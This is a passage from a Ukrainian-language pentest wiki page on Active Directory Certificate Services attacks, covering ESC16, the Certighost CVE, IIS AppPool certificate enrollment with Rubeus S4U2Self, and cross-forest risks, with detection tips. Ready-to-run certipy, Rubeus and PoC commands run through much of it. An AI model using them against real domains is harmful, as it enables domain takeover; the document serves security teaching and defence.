    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Крок 4: Запросіть сертифікат як користувач «victim» за шаблоном автентифікації клієнта, на який обліковий запис може підписатися (наприклад, «User»), на CA, налаштованому за ESC16.** CA не додає до виданого сертифіката розширення безпеки SID, але це саме по собі не забезпечує придатне для використання зіставлення автентифікації. Установіть змінну середовища для кешу облікових даних Kerberos (команда оболонки):

```bash
export KRB5CCNAME=victim.ccache
```

Потім запросіть сертифікат:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Крок 5: Відновіть UPN облікового запису «жертви».**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Крок 6: На старішому KDC або KDC у режимі сумісності, який приймає це слабке зіставлення, пройдіть автентифікацію як цільовий адміністратор.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Підміна ідентичності через callback у rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** зловживає **шляхом chase / callback під час реєстрації в AD CS**, коли CA довіряє атрибутам запиту, наданим запитувачем, щоб визначити ідентичність, яку слід указати у виданому сертифікаті. У публічному PoC сформований запит містить:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: контрольований атакувальником хост/IP, з яким зв’яжеться CA
- **`rmd`**: **DNS-ім’я цільового контролера домену** для імперсонації

Якщо CA виконує цей chase, він з’єднається з атакувальником через **SMB/LSA (`445`)** і **LDAP (`389`)**. Атакувальник використовує **реальний обліковий запис комп’ютера** (зазвичай створений завдяки стандартному значенню **`ms-DS-MachineAccountQuota`**), щоб автентифікувати callback-сеанс як дійсний доменний суб’єкт, але rogue-сервіси повертають натомість атрибути ідентичності **цільового контролера домену**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не прив’язує повернуту ідентичність до автентифікованого суб’єкта callback**, він може видати сертифікат для **контролера домену**, хоча сеанс автентифіковано як контрольований атакувальником обліковий запис комп’ютера. Концептуально ця вразливість відрізняється від **Certifried**: замість перезапису атрибутів AD, як-от `dNSHostName`, атакувальник **підмінює дані ідентичності під час розв’язання callback-запиту CA**.<sup>[[2]](#references)</sup>

**Необхідні умови:**

- Облікові дані **домену** з низькими привілеями
- Можливість **створити або повторно використати обліковий запис комп’ютера**
- Мережева доступність із **CA** до контрольованих атакувальником портів **`389` і `445`**
- Вразливий / неоновлений шлях обробки запитів CA (оновлення Microsoft від **14 липня 2026 року** додало **перевірку контролера домену для `cdc`** та **порівняння розв’язаних SID**)

Отриманий файл **`.pfx`** можна використати для **PKINIT**, отримавши **`.ccache`** і, у сценарії опублікованого PoC, **NT-хеш цільового контролера домену**, чого зазвичай достатньо для **повного захоплення домену**.

### Експлуатація

Публічний PoC автоматизує весь ланцюжок:<sup>[[1]](#references)</sup>

1. Створити або повторно використати контрольований атакувальником **обліковий запис комп’ютера**.
2. Запустити **rogue-слухачі LDAP і SMB/LSA** на портах `389` і `445`.
3. Надіслати запит на сертифікат з контрольованими атакувальником атрибутами **`cdc`** і цільовим атрибутом **`rmd`**.
4. Дозволити CA автентифікуватися на rogue-слухачах як контрольований обліковий запис комп’ютера, але відповідати на запити про ідентичність атрибутами **цільового контролера домену**.
5. Отримати підписаний CA **сертифікат контролера домену**, а потім використати його для **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Корисні runtime-прапорці з PoC:

- `--listener <ip>`: явно вибрати IP для callback, який оголошується в `cdc`
- `--computer-name <NAME$>`: повторно використати наявний обліковий запис комп’ютера замість створення нового

**Операційні примітки:**

- Для PoC потрібен **root**, оскільки він прив’язується до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально зберігаються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат зіставляється з обліковим записом **Domain Controller**, подальші дії можуть включати **Kerberos-аутентифікацію на основі сертифіката**, **DCSync** і повторне використання відновленого **NT-хешу комп’ютера**.<sup>[[2]](#references)</sup>

## Зарахування комп’ютера IIS AppPool для отримання прав Administrator на тому самому хості

Пул IIS, що працює як `ApplicationPoolIdentity`, використовує **обліковий запис комп’ютера** свого хоста для вихідного доступу до мережевих ресурсів. Тому виконання коду від імені `IIS AppPool\<POOL>` залишається низькопривілейованим у локальному токені, але може надіслати запит до AD CS, який CA автентифікує як `HOST$`; це перехід вихідної ідентичності, а не імперсонація токена чи локальне підвищення привілеїв у стилі Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Для цього ланцюжка потрібні хост IIS, приєднаний до домену, Enterprise CA, доступний через RPC, опублікований шаблон машинної автентифікації, для якого комп’ютер має права на зарахування, підтримка PKINIT, а також доступність KDC/SMB. Користувацька ідентичність пулу змінює вихідний principal, тому перш ніж припускати, що це `HOST$`, перевірте, що пул справді використовує `ApplicationPoolIdentity`.<sup>[[19]](#references)[[20]](#references)</sup>

### Зарахування з ключем під контролем зловмисника

Згенеруйте пару ключів і CSR поза сервером IIS та збережіть приватний ключ. З скомпрометованого worker-а надсилайте **лише CSR**. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) створює екземпляр `CertificateAuthority.Request`, задає `CertificateTemplate:Machine`, викликає `ICertRequest::Submit` і повертає виданий сертифікат. Використовуйте рядок конфігурації CA `CAHOST\CA-NAME`; звичайний шаблон `Machine` формує subject з AD, тому дані subject/SAN, надані запитувачем, не потрібні.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Поєднайте повернутий сертифікат із **відповідним збереженим ключем**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` працює лише тоді, коли Windows уже може зіставити сертифікат із доступним приватним ключем; для окремих PEM-файлів явно створіть PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Використайте PFX для PKINIT і збережіть отриманий TGT комп’ютера у форматі base64 замість того, щоб одразу його інжектувати:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self плюс підміна служби на тому самому хості

S4U2Self дає змогу службі отримати квиток **до себе**, що містить авторизаційні дані іншого користувача. Маючи TGT комп’ютера, Rubeus може запросити такий квиток для привілейованого користувача, переписати ім’я служби у повернутому KRB-CRED на CIFS і впровадити його. Це локальний примітив «delegate to thyself»: він не потребує S4U2Proxy або запису `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Підставлений ticket придатний лише для служб на **тому самому обліковому записі/ключі комп’ютера** (тут — CIFS на `HOST`). Це не універсальний ticket Administrator для інших машин домену. Також продемонстрований результат — привілейований доступ до SMB/файлової системи як Administrator; для запуску процесу від імені локального `NT AUTHORITY\SYSTEM` потрібен окремий крок віддаленого виконання.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Виявлення та посилення захисту

- На CA зіставляйте події Certification Services **4886** (отримано запит) і **4887** (видано сертифікат) для неочікуваних запитів шаблону `Machine` від облікових записів IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- На DC подія **4768** містить поля сертифіката, коли використовується попередня автентифікація на основі сертифіката; сповіщайте про незвичні запити PKINIT TGT для облікових записів вебсерверів. Далі перевіряйте запити **4769**, що стосуються привілейованої ідентичності, від імені якої здійснюється impersonation, і того самого хоста. Оскільки Rubeus переписує ім’я служби KRB-CRED на стороні клієнта за допомогою `/altservice`, не вимагайте, щоб ім’я служби 4769 на стороні DC було `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Шукайте випадки, коли `w3wp.exe` звертається до кінцевих точок RPC CA, неочікуване створення файлів ASPX, доступ до адміністративних спільних ресурсів із автентифікацією Kerberos і активність зі зливу секретів. За можливості обмежте доступ рівня застосунків до RPC CA/KDC/SMB і вилучіть права реєстрації комп’ютерів або шаблони машинної автентифікації, які не потрібні для роботи.<sup>[[19]](#references)</sup>

## Компрометація лісів за допомогою сертифікатів, пояснена в пасивному стані

### Порушення довіри між лісами через скомпрометовані CA

Конфігурація **реєстрації між лісами** робиться відносно простою. Адміністратори **публікують сертифікат кореневого CA** лісу ресурсів **у лісах облікових записів**, а сертифікати **корпоративних CA** лісу ресурсів **додають до контейнерів `NTAuthCertificates` і AIA в кожному лісі облікових записів**. Інакше кажучи, така конфігурація надає **CA в лісі ресурсів повний контроль** над усіма іншими лісами, для яких він керує PKI. Якщо цей CA **буде скомпрометовано зловмисниками**, вони зможуть **підробити** сертифікати всіх користувачів у лісах ресурсів і облікових записів, порушивши межу безпеки лісу.<sup>[[6]](#references)</sup>

### Надання іноземним суб’єктам прав на реєстрацію

У середовищах із кількома лісами слід уважно перевіряти корпоративні CA, які **публікують шаблони сертифікатів**, що надають **Authenticated Users або іноземним суб’єктам** (користувачам/групам поза лісом, до якого належить корпоративний CA) **права на реєстрацію та редагування**.\
Під час автентифікації через довірчі відносини AD додає SID **Authenticated Users** до токена користувача. Тому, якщо домен має корпоративний CA із шаблоном, який **надає Authenticated Users права на реєстрацію**, користувач з іншого лісу потенційно може **зареєструватися за цим шаблоном**. Так само, якщо шаблон **явно надає права на реєстрацію іноземному суб’єкту**, цим **створюється міжлісовий зв’язок контролю доступу**, що дає суб’єкту з одного лісу змогу **зареєструватися за шаблоном з іншого лісу**.

Обидва сценарії **збільшують поверхню атаки** між лісами. Зловмисник може скористатися налаштуваннями шаблону сертифіката, щоб отримати додаткові привілеї в іноземному домені.<sup>[[6]](#references)</sup>


## References

- [1] [Репозиторій PoC aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n — технічний аналіз Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 — блог SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps — Certified Pre-Owned: зловживання Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak — Certipy 4.0: ESC9, ESC10, графічний інтерфейс BloodHound, нові методи автентифікації та запитів і багато іншого](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps — Shadow Credentials: зловживання зіставленням облікового запису через довіру до ключа для захоплення облікового запису](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy — історія про (не)правильне використання Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security — ретрансляція до AD Certificate Services через RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo — ESC12: доступ до оболонки на CA ADCS із YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps — техніка зловживання ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps — техніка зловживання ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki — підвищення привілеїв (ESC1–ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec — EKUwu: не просто черговий ESC для AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 — AD CS ESC16: неправильне налаштування та експлуатація](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark — повертаючись до «Delegate 2 Thyself»](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai — PoC реєстрації IIS в AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux — підвищення привілеїв із IIS AppPool через кінцеву точку RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft — ідентичності пулів застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft — ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Специфікації Microsoft Open — S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL — команда pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft — аудит Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft — подія 4768: запит квитка автентифікації Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft — подія 4769: запит квитка служби Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai — набір інструментів PowerShell для експлуатації AD CS](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
